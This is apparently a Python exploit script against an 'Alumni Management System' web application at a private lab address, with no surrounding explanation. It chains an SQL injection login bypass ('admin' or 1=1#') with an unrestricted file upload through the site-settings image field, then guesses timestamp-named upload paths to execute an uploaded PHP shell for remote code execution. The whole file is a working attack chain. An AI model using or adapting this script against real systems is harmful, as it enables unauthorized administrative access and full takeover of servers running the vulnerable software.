import requests
import time

def sqli_admin():
	s = requests.Session()
	data = {"username":"admin' or 1=1#","password":"hacked"}
	adminlogin = "http://10.0.2.13/alumni/admin/ajax.php?action=login"
	s.post(adminlogin,data=data)
	print(s.cookies)
	return s

def trigger_rce(session):
	starttime = int(time.time())
	multipart_form_data = {
	"name": ("Alumni Management System"),
	"email": ("test@test.com"),
	"contact" : ("+60123456789"),
	"about" : ("Nothing much about it"),
	"img" : ("yunaranyancat.php", open("yunaranyancat.php", "rb"))
	}
	session.post("http://10.0.2.13/alumni/admin/ajax.php?action=save_settings", files=multipart_form_data)
	session.get("http://10.0.2.13/alumni/admin/index.php?page=site_settings")
	get_shell(starttime-100,starttime+100,session)


def get_shell(start,end,session):
	for i in range(start,end):
		print(i)
		session.get("http://10.0.2.13/alumni/admin/assets/uploads/"+str(i)+"_yunaranyancat.php")

def main():
	session = sqli_admin()
	trigger_rce(session)


main()
